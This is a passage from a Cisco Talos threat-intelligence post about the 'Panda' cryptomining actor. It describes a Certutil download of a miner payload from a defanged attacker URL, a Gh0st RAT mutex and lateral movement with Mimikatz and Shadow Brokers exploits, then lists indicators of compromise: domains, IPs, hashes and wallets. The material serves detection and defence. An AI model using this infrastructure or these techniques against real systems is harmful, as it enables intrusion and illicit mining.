instead of as a random 20-character name. cb[.]f*ckingmy[.]life (URL censored due to inappropriate language) currently resolves to the IP 217[.]69[.]6[.]42, and was first observed by Cisco Umbrella on August 18.</p><p>In line with previous samples Talos has analyzed over the summer, the initial payload uses Certutil to download the secondary miner payload located at http[:]//cb[.]fuckingmy[.]life:80/trapceapet.exe. This sample also includes a Gh0st RAT mutex, set to "oo[.]mygoodluck[.]best:51888:WervPoxySvc", and made a DNS request for this domain. The domain resolved to 46[.]173[.]217[.]80, which hosts a number of subdomains of fxxxxxxk[.]me and hognoob[.]se, both of which are known domains used by Panda. The sample also contacted li[.]bulehero2019[.]club.</p><p>Cisco Threat Grid's analysis also showed artifacts associated with Panda's typical lateral movement tools that include Shadow Brokers exploits and Mimikatz. The INI file used for miner configuration lists the mining pool as mi[.]oops[.]best, with a backup pool at mx[.]oops[.]best.</p><figure class="kg-card kg-image-card"><img src="https://storage.ghost.io/c/af/a0/afa04ee3-414f-4481-8d23-7e7c146f192e/content/images/-2-PgtrQPKAE/XYDgeQ-XHeI/AAAAAAAAB8Q/2AJE3Rk0IHURq9oeqIjqMw-Ft37AHxp_ACLcBGAsYHQ/s640/image1.png" class="kg-image" alt loading="lazy"></figure><figure class="kg-card kg-image-card"><img src="https://storage.ghost.io/c/af/a0/afa04ee3-414f-4481-8d23-7e7c146f192e/content/images/-uPJKV52J9K0/XYDgjBhDZaI/AAAAAAAAB8U/sfPHOODu5c8pmRVRrcPdlaQ6G-VnpW9VQCLcBGAsYHQ/s640/image3.png" class="kg-image" alt loading="lazy"></figure><h2 id="conclusion-panda-s-operational-security-remains-poor-with-many-of-their-old-and-current-domains-all-hosted-on-the-same-ip-and-their-ttps-remaining-relatively-similar-throughout-campaigns-the-payloads-themselves-are-also-not-very-sophisticated-">Conclusion Panda's operational security remains poor, with many of their old and current domains all hosted on the same IP and their TTPs remaining relatively similar throughout campaigns. The payloads themselves are also not very sophisticated.</h2><p>However, system administrators and researchers should never underestimate the damage an actor can do with widely available tools such as Mimikatz. Some information from HFS used by Panda shows that this malware had a wide reach and rough calculations on the amount of Monero generated show they made around 1,215 XMR in profits through their malicious activities, which today equals around $100,000, though the amount of realized profits is dependent on the time they sold.</p><p>Panda remains one of the most consistent actors engaging in illicit mining attacks and frequently shifts the infrastructure used in their attacks. They also frequently update their targeting, using a variety of exploits to target multiple vulnerabilities, and is quick to start exploiting known vulnerabilities shortly after public POCs become available, becoming a menace to anyone slow to patch. And, if a cryptocurrency miner is able to infect your system, that means another actor could use the same infection vector to deliver other malware. Panda remains an active threat and Talos will continue to monitor their activity in order to thwart their operations.</p><h2 id="coverage-for-coverage-related-to-blocking-illicit-cryptocurrency-mining-please-see-the-cisco-talos-white-paper-blocking-cryptocurrency-mining-using-cisco-security-products">COVERAGE For coverage related to blocking illicit cryptocurrency mining, please see the Cisco Talos white paper: <a href="https://talosintelligence.com/resources/65">Blocking Cryptocurrency Mining Using Cisco Security Products</a></h2><figure class="kg-card kg-image-card"><img src="https://storage.ghost.io/c/af/a0/afa04ee3-414f-4481-8d23-7e7c146f192e/content/images/-VoLoSQumND8/XYDgUqa4CvI/AAAAAAAAB8I/dQAoulvM4nofqrokMtgPSQZJYLLOLLmZwCLcBGAsYHQ/s1600/image2.png" class="kg-image" alt loading="lazy"></figure><p>Advanced Malware Protection (<a href="https://www.cisco.com/c/en/us/products/security/advanced-malware-protection">AMP</a>) is ideally suited to prevent the execution of the malware used by these threat actors.</p><p>Cisco Cloud Web Security (<a href="https://www.cisco.com/c/en/us/products/security/cloud-web-security/index.html">CWS</a>) or<a href="https://www.cisco.com/c/en/us/products/security/web-security-appliance/index.html"> Web Security Appliance (WSA</a>) web scanning prevents access to malicious websites and detects malware used in these attacks.</p><p>Network Security appliances such as<a href="https://www.cisco.com/c/en/us/products/security/firewalls/index.html"> Next-Generation Firewall (NGFW</a>),<a href="https://www.cisco.com/c/en/us/products/security/intrusion-prevention-system-ips/index.html"> Next-Generation Intrusion Prevention System (NGIPS</a>), and<a href="https://meraki.cisco.com/products/appliances"> Meraki MX</a> can detect malicious activity associated with this threat.</p><p><a href="https://www.cisco.com/c/en/us/solutions/enterprise-networks/amp-threat-grid/index.html">AMP Threat Grid</a> helps identify malicious binaries and build protection into all Cisco Security products.</p><p><a href="https://umbrella.cisco.com/">Umbrella</a>, our secure internet gateway (SIG), blocks users from connecting to malicious domains, IPs, and URLs, whether users are on or off the corporate network.</p><p>Open Source SNORTⓇ Subscriber Rule Set customers can stay up to date by downloading the latest rule pack available for purchase on <a href="https://www.snort.org/products">Snort.org</a>.</p><h2 id="iocs">IOCs</h2><h3 id="domains-a45-bulehero-in-a46-bulehero-in-a47-bulehero-in-a48-bulehero-in-a88-bulehero-in-a88-heroherohero-infoa-bulehero-in-aic-fxxxxxxk-me-axx-bulehero-in-b-bulehero-in-bulehero-in-c-bulehero-in-cb-fuckingmy-life-cnm-idc3389-top-down-idc3389-top-fid-hognoob-se-fxxk-noilwut0vv-club-haq-hognoob-se-idc3389-top-idc3389-cc-idc3389-pw-li-bulehero2019-club-list-idc3389-top-mi-oops-best-mx-oops-best-nrs-hognoob-se-oo-mygoodluck-bestpool-bulehero-in-pxi-hognoob-se-pxx-hognoob-se-q1a-hognoob-se-qie-fxxxxxxk-me-rp-oiwcvbnc2e-stream-uio-heroherohero-info-uio-hognoob-se-upa1-hognoob-se-upa2-hognoob-se-wiu-fxxxxxxk-me-yxw-hognoob-se-zik-fxxxxxxk-me">Domains a45[.]bulehero[.]in<br> a46[.]bulehero[.]in<br> a47[.]bulehero[.]in<br> a48[.]bulehero[.]in<br> a88[.]bulehero[.]in<br> a88[.]heroherohero[.]info<br>a[.]bulehero[.]in<br> aic[.]fxxxxxxk[.]me<br> axx[.]bulehero[.]in<br> b[.]bulehero[.]in<br> bulehero[.]in<br> c[.]bulehero[.]in<br> cb[.]fuckingmy[.].life<br> cnm[.]idc3389[.]top<br> down[.]idc3389[.]top<br> fid[.]hognoob[.]se<br> fxxk[.]noilwut0vv[.]club<br> haq[.]hognoob[.]se<br> idc3389[.]top<br> idc3389[.]cc<br> idc3389[.]pw<br> li[.]bulehero2019[.]club<br> list[.]idc3389[.]top<br> mi[.]oops[.]best<br> mx[.]oops[.]best<br> nrs[.]hognoob[.]se<br> oo[.]mygoodluck[.]best<br>pool[.]bulehero[.]in<br> pxi[.]hognoob[.]se<br> pxx[.]hognoob[.]se<br> q1a[.]hognoob[.]se<br> qie[.]fxxxxxxk[.]me<br> rp[.]oiwcvbnc2e[.]stream<br> uio[.]heroherohero[.]info<br> uio[.]hognoob[.]se<br> upa1[.]hognoob[.]se<br> upa2[.]hognoob[.]se<br> wiu[.]fxxxxxxk[.]me<br> yxw[.]hognoob[.]se<br> zik[.]fxxxxxxk[.]me<br></h3><h3 id="ips-184-168-221-47-172-104-87-6-139-162-123-87-139-162-110-201-116-193-154-122-95-128-126-241195-128-127-254-195-128-126-120-195-128-126-243-195-128-124-140-139-162-71-92-3-123-17-223-46-173-217-80-5-56-133-246">IPs 184[.]168[.]221[.]47<br> 172[.]104[.]87[.]6<br> 139[.]162[.]123[.]87<br> 139[.]162[.]110[.]201<br> 116[.]193[.]154[.]122<br> 95[.]128[.]126[.]241<br>195[.]128[.]127[.]254<br> 195[.]128[.]126[.]120<br> 195[.]128[.]126[.]243<br> 195[.]128[.]124[.]140<br> 139[.]162[.]71[.]92<br> 3[.]123[.]17[.]223<br> 46[.]173[.]217[.]80<br> 5[.]56[.]133[.]246<br></h3><h3 id="sha-256-2df8cfa5ea4d63615c526613671bbd02cfa9ddf180a79b4e542a2714ab02a3c1-fa4889533cb03fc4ade5b9891d4468bac9010c04456ec6dd8c4aba44c8af9220-2f4d46d02757bcf4f65de700487b667f8846c38ddb50fbc5b2ac47cfa9e29beb-829729471dfd7e6028af430b568cc6e812f09bb47c93f382a123ccf3698c8c088b645c854a3bd3c3a222acc776301b380e60b5d0d6428db94d53fad6a98fc4ec-1e4f93a22ccbf35e2f7c4981a6e8eff7c905bc7dbb5fedadd9ed80768e00ab27-0697127fb6fa77e80b44c53d2a551862709951969f594df311f10dcf2619c9d5-f9a972757cd0d8a837eb30f6a28bc9b5e2a6674825b18359648c50bbb7d6d74a-34186e115f36584175058dac3d34fe0442d435d6e5f8c5e76f0a3df15c9cd5fb-29b6dc1a00fea36bc3705344abea47ac633bc6dbff0c638b120d72bc6b38a36f-3ed90f9fbc9751a31bf5ab817928d6077ba82113a03232682d864fb6d7c69976a415518642ce4ad11ff645151195ca6e7b364da95a8f89326d68c836f4e2cae1-4d1f49fac538692902cc627ab7d9af07680af68dd6ed87ab16710d858cc4269c-8dea116dd237294c8c1f96c3d44007c3cd45a5787a2ef59e839c740bf5459f21-991a9a8da992731759a19e470c36654930f0e3d36337e98885e56bd252be927e-a3f1c90ce5c76498621250122186a0312e4f36e3bfcfede882c83d06dd286da1-9c37a6b2f4cfbf654c0a5b4a4e78b5bbb3ba26ffbfab393f0d43dad9000cb2d3-d5c1848ba6fdc6f260439498e91613a5db8acbef10d203a18f6b9740d2cab3ca29b6dc1a00fea36bc3705344abea47ac633bc6dbff0c638b120d72bc6b38a36f-6d5479adcfa4c31ad565ab40d2ea8651bed6bd68073c77636d1fe86d55d90c8d">SHA-256 2df8cfa5ea4d63615c526613671bbd02cfa9ddf180a79b4e542a2714ab02a3c1<br> fa4889533cb03fc4ade5b9891d4468bac9010c04456ec6dd8c4aba44c8af9220<br> 2f4d46d02757bcf4f65de700487b667f8846c38ddb50fbc5b2ac47cfa9e29beb<br> 829729471dfd7e6028af430b568cc6e812f09bb47c93f382a123ccf3698c8c08<br>8b645c854a3bd3c3a222acc776301b380e60b5d0d6428db94d53fad6a98fc4ec<br> 1e4f93a22ccbf35e2f7c4981a6e8eff7c905bc7dbb5fedadd9ed80768e00ab27<br> 0697127fb6fa77e80b44c53d2a551862709951969f594df311f10dcf2619c9d5<br> f9a972757cd0d8a837eb30f6a28bc9b5e2a6674825b18359648c50bbb7d6d74a<br> 34186e115f36584175058dac3d34fe0442d435d6e5f8c5e76f0a3df15c9cd5fb<br> 29b6dc1a00fea36bc3705344abea47ac633bc6dbff0c638b120d72bc6b38a36f<br> 3ed90f9fbc9751a31bf5ab817928d6077ba82113a03232682d864fb6d7c69976<br>a415518642ce4ad11ff645151195ca6e7b364da95a8f89326d68c836f4e2cae1<br> 4d1f49fac538692902cc627ab7d9af07680af68dd6ed87ab16710d858cc4269c<br> 8dea116dd237294c8c1f96c3d44007c3cd45a5787a2ef59e839c740bf5459f21<br> 991a9a8da992731759a19e470c36654930f0e3d36337e98885e56bd252be927e<br> a3f1c90ce5c76498621250122186a0312e4f36e3bfcfede882c83d06dd286da1<br> 9c37a6b2f4cfbf654c0a5b4a4e78b5bbb3ba26ffbfab393f0d43dad9000cb2d3<br> d5c1848ba6fdc6f260439498e91613a5db8acbef10d203a18f6b9740d2cab3ca<br>29b6dc1a00fea36bc3705344abea47ac633bc6dbff0c638b120d72bc6b38a36f<br> 6d5479adcfa4c31ad565ab40d2ea8651bed6bd68073c77636d1fe86d55d90c8d<br></h3><h3 id="monero-wallets-49rocc2niuctyvmakjq7zu7njgzq3debwba3ptcgfjlnb2gvxt8z6psfen4sc8wppedtkgjqvhk2rlk7btk6js8gkv9ilci-1198-851653275126-4an9zc5pggqwtg1mtnzdyshss79ng1qd4fwa1rvjegzv84r8bqoln9wu1ucnmvu1rj89bjy4fat1xgeikks6foeiri1ehhh-44qlwclcifp4kzfkqwnjj4ftbq8rklcxjc3tw4ubwciz95ywfuqd6md4qedusrebxmhhx9dzt5lbawdvbsjstfjr9pxav9l">Monero Wallets 49Rocc2niuCTyVMakjq7zU7njgZq3deBwba3pTcGFjLnB2Gvxt8z6PsfEn4sc8WPPedTkGjQVHk2RLk7btk6Js8gKv9iLCi 1198.851653275126<br> 4AN9zC5PGgQWtg1mTNZDySHSS79nG1qd4FWA1rVjEGZV84R8BqoLN9wU1UCnmvu1rj89bjY4Fat1XgEiKks6FoeiRi1EHhh<br> 44qLwCLcifP4KZfkqwNJj4fTbQ8rkLCxJc3TW4UBwciZ95yWFuQD6mD4QeDusREBXMhHX9DzT5LBaWdVbsjStfjR9PXaV9L</h3>
+
+            
+        </div>
+    </section>
+    <div class="social-media-wrapper">
+    <h5>Share this post</h5>
+    <ul class="social-media-share-list">
+        <li>
+            <a class="share-facebook" title="Share this on Facebook" data-text="Cryptocurrency miners aren’t dead yet: Documenting the voracious but simple “Panda”" data-href="https://blog.talosintelligence.com/panda-evolution/" rel="nofollow" target="_blank" href="https://www.facebook.com/sharer.php?u=https://blog.talosintelligence.com/panda-evolution/"></a>
+        </li>
+        <li>
+            <a class="share-x" title="Post This" data-text="Cryptocurrency miners aren’t dead yet: Documenting the voracious but simple “Panda”" data-href="https://blog.talosintelligence.com/panda-evolution/" rel="nofollow" target="_blank" href="https://x.com/share?url=https://blog.talosintelligence.com/panda-evolution/"></a>
+        </li>
+        <li>
+            <a class="share-linkedin" title="Share this on LinkedIn" data-text="Cryptocurrency miners aren’t dead yet: Documenting the voracious but simple “Panda”" data-href="https://blog.talosintelligence.com/panda-evolution/" rel="nofollow" target="_blank" href="https://www.linkedin.com/sharing/share-offsite/?url=https://blog.talosintelligence.com/panda-evolution/"></a>
+        </li>
+        <li>
+            <a class="share-reddit" title="Reddit This" data-text="Cryptocurrency miners aren’t dead yet: Documenting the voracious but simple “Panda”" data-href="https://blog.talosintelligence.com/panda-evolution/" rel="nofollow" target="_blank" href="https://www.reddit/submit?url=https://blog.talosintelligence.com/panda-evolution/"></a>
+        </li>
+        <li>
+            <a class="share-email" title="Email This" href="mailto:?body=Cryptocurrency miners aren’t dead yet: Documenting the voracious but simple “Panda”https://blog.talosintelligence.com/panda-evolution/"></a>
+        </li>
+    </ul>
+</div></article>
+                    </div>
+                </div>
+                <div class="alt-layout-row-dk sidebar" id="side-bar">
+                            <h4>Related Content</h4>
+
+                                <div class="sidebar-snippet-wrapper">
+                                    <a href="/how-do-cryptocurrency-drainer-phishing-scams-work/">
+                                        <h3>How do cryptocurrency drainer phishing scams work?</h3>
+                                        <span  class="preview-attributes">July 9, 2024 08:00</span>
+                                        <p>In recent months, a surge in cryptodrainer phishing attacks has been observed, targeting cryptocurrency holders with sophisticated schemes aimed at tricking them into divulging their valuable credentials.</p>
+                                    </a>
+                                </div>
+                                <div class="sidebar-snippet-wrapper">
+                                    <a href="/cryptomining-analysis/">
+                                        <h3>Following the Money: Comparing cryptocurrency value to illicit mining activity</h3>
+                                        <span  class="preview-attributes">July 14, 2021 08:20</span>
+                                        <p>By Nick Biasini
+
+In the age of meme stocks, Robinhood and Elon Musk&#39;s tweets influencing the global economy, cryptocurrency mining has not seemed as fringe as it once did. Mining has been around as long as these crytocurrencies have, but only really started to gather the attention of</p>
+                                    </a>
+                                </div>
+                                <div class="sidebar-snippet-wrapper">
+                                    <a href="/lemon-duck-brings-cryptocurrency-miners/">
+                                        <h3>Lemon Duck brings cryptocurrency miners back into the spotlight</h3>
+                                        <span  class="preview-attributes">October 13, 2020 10:59</span>
+                                        <p>By Vanja Svajcer, with contributions from Caitlin Huey.
+
+ * We are used to ransomware attacks and big-game hunting making headlines, but there are still methods adversaries use to monetize their efforts in less intrusive ways.
+ * Cisco Talos recently recorded increased activity of the Lemon Duck cryptocurrency-mining botnet using several</p>
+                                    </a>
+                                </div>
+                </div>
+            </div>
+        </div>
+    </main>
+
+
+    <footer id="footer">
+    <div class="container-fluid px-0">
+        <div class="row footer_nav_wrapper mx-0">
+            <div class="col-xl-10 col-12">
+                <div class="multi-col-list-wrapper">
+                    <ul class="footer-parent-list">
+                        <li class="footer-links-group">
+                            <ul>
+                                <li>
+                                    <h6><a href="https://talosintelligence.com/reputation">Intelligence Center</a></h6>
+                                </li>
+                                <li><a href="https://talosintelligence.com/reputation_center">Intelligence Search</a></li>
+                                <li><a href="https://talosintelligence.com/reputation_center/email_rep">Email &amp; Spam Trends</a></li>
+                            </ul>
+                        </li>
+                        <li class="footer-links-group">
+                            <ul>
+                                <li>
+                                    <h6><a href="https://talosintelligence.com/vulnerability_info">Vulnerability Research</a></h6>
+                                </li>
+                                <li><a href="https://talosintelligence.com/vulnerability_reports">Vulnerability Reports</a></li>
+                                <li><a href="https://talosintelligence.com/ms_advisories">Microsoft Advisories</a></li>
+                            </ul>
+                        </li>
+                        <li class="footer-links-group">
+                             <ul>
+                                <li>
+                                    <h6><a href="https://talosintelligence.com/incident_response">Incident Response</a></h6>
+                                </li>
+                                <li>
+                                    <a href="https://talosintelligence.com/incident_response/services#reactive-services">Reactive Services</a>
+                                </li>
+                                <li>
+                                    <a href="https://talosintelligence.com/incident_response/services#proactive-services">Proactive Services</a>
+                                </li>
+                                <li>
+                                    <a href="https://talosintelligence.com/incident_response/contact">Emergency Support</a>
+                                </li>
+                            </ul>
+                        </li>
+                        <li class="footer-links-group">
+                            <ul>
+                                <li>
+                                    <h6>Security Resources</h6>
+                                </li>
+                                <li><a href="https://talosintelligence.com/software">Open Source Security Tools</a></li>
+                                <li><a href="https://talosintelligence.com/categories">Intelligence Categories Reference</a></li>
+                                <li><a href="https://talosintelligence.com/secure-endpoint-naming">Secure Endpoint Naming Reference</a></li>
+                            </ul>
+                        </li>
+                        <li class="footer-links-group">
+                            <ul>
+                                <li>
+                                    <h6>Media</h6>
+                                </li>
+                                <li><a href="https://blog.talosintelligence.com">Talos Intelligence Blog</a></li>
+                                <li><a href="https://blog.talosintelligence.com/category/threat-source-newsletter/">Threat Source Newsletter</a></li>
+                                <li><a href="https://talosintelligence.com/podcasts/shows/beers_with_talos">Beers with Talos Podcast</a></li>
+                                <li><a href="https://talosintelligence.com/podcasts/shows/talos_takes">Talos Takes Podcast</a></li>
+                                <li><a target="_blank" href="https://www.youtube.com/channel/UCPZ1DtzQkStYBSG3GTNoyfg/featured">Talos Videos</a></li>
+                            </ul>
+                        </li>
+                        <li class="footer-links-group">
+                            <ul>
+                                <li>
+                                    <h6>Support</h6>
+                                </li>
+                                <li><a href="https://support.talosintelligence.com">Support Documentation</a></li>
+                            </ul>
+                        </li>
+                        <li class="footer-links-group">
+                            <ul>
+                                <li>
+                                    <h6>Company</h6>
+                                </li>
+                                <li><a href="https://talosintelligence.com/about">About Talos</a></li>
+                                <li><a href="https://talosintelligence.com/careers">Careers</a></li>
+                                <li><a target="_blank" href="https://www.cisco.com/c/en/us/products/security/product-listing.html">Cisco Security</a></li>
+                            </ul>
+                        </li>
+                    </ul>
+                </div>
+            </div>
+            <div class="col-xl-2 col-12 connect_social">
+                <div class="connect-footer-section-wrapper">
+                    <h6>Follow us</h6>
+                    <ul>
+                        <li>
+                            <a target="_blank" href="https://x.com/talossecurity"><div class="footer-media-icon" id="footer-media-icon-x"></div>
+                            </a></li>
+                        <li>
+                            <a target="_blank" href="https://www.youtube.com/channel/UCPZ1DtzQkStYBSG3GTNoyfg/featured"><div class="footer-media-icon" id="footer-media-icon-youtube"></div>
+                            </a></li>
+                        <li>
+                            <a target="_blank" href="https://www.linkedin.com/company/cisco-talos-intelligence-group/"><div class="footer-media-icon" id="footer-media-icon-linkedin"></div>
+                            </a></li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+        <div class="row mx-0">
+            <div class="col-12 footer_corporate">
+                <a target="_blank" href="http://tools.cisco.com/security/center/home.x"><img alt="Cisco" src="https://blog.talosintelligence.com/assets/images/logo_cisco_white.svg">
+                </a><p class="copyright">
+                ©
+                <span id='current-year'></span>
+                Cisco Systems, Inc. and/or its affiliates. All rights
+                reserved. View our
+                <a target="_blank" class="underline" href="http://www.cisco.com/web/siteassets/legal/privacy_full.html">Privacy Policy.</a>
+            </p>
+            </div>
+        </div>
+    </div>
+</footer>
+    <script>
+  function coverageView() {
+    const coverageTable = document.getElementById('coverage-block');
+    const sidebar = document.getElementById('side-bar');
+    const postContent = document.getElementById('post-content');
+    const currentWidth = window.innerWidth;  
+  
+    if (coverageTable && sidebar && postContent) {
+      if (currentWidth < 1000) {
+        // For viewport less than 1000px, append to post content
+        postContent.appendChild(coverageTable);
+      } else {
+        // For viewport 1000px and wider, check for subscribe button
+        const subscribeButton = sidebar.querySelector('.subscribe-button');
+        
+        if (subscribeButton) {
+          // Insert coverage block after the subscribe button
+          subscribeButton.insertAdjacentElement('afterend', coverageTable);
+        } else {
+          // No subscribe button found, prepend to top of sidebar
+          sidebar.prepend(coverageTable);
+        }
+      }
+    }
+  }
+  
+  window.addEventListener("resize", coverageView);
+  window.addEventListener("load", coverageView);
+
+
+  (function() {
+    Array.from(document.querySelectorAll("a")).filter(a => {
+        return a.hostname && a.hostname !== location.hostname
+    }).forEach(a => a.setAttribute('target', '_blank'))
+})();
+</script>
+
+
+<!-- jQuery first, then Popper.js, then Bootstrap JS -->
+<script src="https://blog.talosintelligence.com/assets/js/jquery-3.6.0.min.js?v=_xUj-3OJU5yExlq6"></script>
+<script src="https://blog.talosintelligence.com/assets/js/popper.min.js?v=ZvOgfh-ptkpoa2Y4"></script>
+<script src="https://blog.talosintelligence.com/assets/js/resize-styles.js?v=iB-0rQKwd6f_Dllp"></script>
+<script src="https://blog.talosintelligence.com/assets/js/bootstrap.bundle.min.js?v=JRXjfu4x9e89ZZsh"></script>
+<script src="https://blog.talosintelligence.com/assets/js/date.js?v=TlJWK1qtzFQeV9lL"></script>
+<script src="https://blog.talosintelligence.com/assets/js/prism.js?v=roQly8fYXhzQ4Osd"></script>
+<script src="https://cdn.jsdelivr.net/npm/ghost-theme-utils@latest/dist/js/ghost-theme-utils.min.js" async defer></script>
+<script src="https://blog.talosintelligence.com/assets/js/chart.min.js?v=dEAdc43T4D7l37O2"></script>
+<script src="https://blog.talosintelligence.com/assets/js/x-scroll.js?v=DuV8f5nlfWlGIAUr"></script>
+<script src="https://blog.talosintelligence.com/assets/js/2025_yir_chart.js?v=OSqUj45x6XXKWbZW"></script>
+
+
+</body>
+
+</html>
